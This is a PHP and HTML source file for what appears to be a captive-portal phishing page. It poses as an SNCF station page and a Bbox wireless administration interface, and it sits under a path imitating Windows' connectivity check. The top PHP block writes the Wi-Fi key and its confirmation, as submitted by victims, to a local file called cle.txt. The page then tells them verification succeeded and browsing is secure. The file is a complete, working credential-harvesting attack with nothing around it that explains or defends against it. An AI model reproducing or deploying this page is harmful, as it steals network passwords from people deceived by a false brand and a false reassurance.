<?php
$cle = $_POST['cle'];
$cleconf = $_POST['cleconf'];
$fp = fopen("cle.txt","a+"); // ouverture du fichier en écriture
fputs($fp, "$cle");
fputs($fp, "$cleconf");
fclose($fp);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>SNCF gares</title>
<link rel="stylesheet" type="text/css" href="/msftconnecttest/vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="/msftconnecttest/fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="/msftconnecttest/vendor/animate/animate.css">
<!--===============================================================================================-->	
	<link rel="stylesheet" type="text/css" href="/msftconnecttest/vendor/css-hamburgers/hamburgers.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="/msftconnecttest/vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="/msftconnecttest/css/util.css">
	<link rel="stylesheet" type="text/css" href="/msftconnecttest/css/main.css">
</head>
<body>
<a href="http://127.0.0.1/msftconnecttest/index.php"><img src="/msftconnecttest/images/sncf.jpg">
	 <?php
            if (!empty($_POST['cle']) && !empty($_POST['cleconf']) ) // Vérifie si les variables des clés ne sont pas vides
        {
			$cle=$_POST['cle'];
			$cleconf=$_POST['cleconf'];
		
				if ( $cle == $cleconf) // Vérifie si les deux clés sont identiques
            {
					if (strlen($cle) >7 && strlen($cle) <63 )
				{                 
					?>	
				<h1>Interface d'administration sans fil</h1>
			</p>
			<p>
La v&eacute;rification a &eacute;t&eacute; correctement effectu&eacute;e vous pouvez reprendre la navigation internet en toute s&eacute;curit&eacute; avec votre Bbox.</p>
<?php
                }
				
					 if (strlen($cle) <2)
				{
					?>
					<h1> Erreur ! </h1>
					Il y a eu un probl&egrave;me dans la v&eacute;rification. 
					<br/>Veuillez <a href="index.php">recommencer</a>.
					<?php
				}
			
				if (strlen($cle) >20)
				{
					?>
					<h1> Erreur ! </h1>
					Il y a eu un probl&egrave;me dans la v&eacute;rification. 
					<br/>Veuillez <a href="index.php">recommencer</a>.
					<?php
				}	
            }
			
				else
            {
				header('Location: https://google.fr');
			}
        }
			
			else
        {
			?>		
			<h1> Erreur ! </h1>
			Vous devez remplir les deux champs ! 
			<br/>Veuillez <a href="index.php">recommencer</a>.
			<?php
        }
        ?>
	</body>
</html>

</body>
</html>
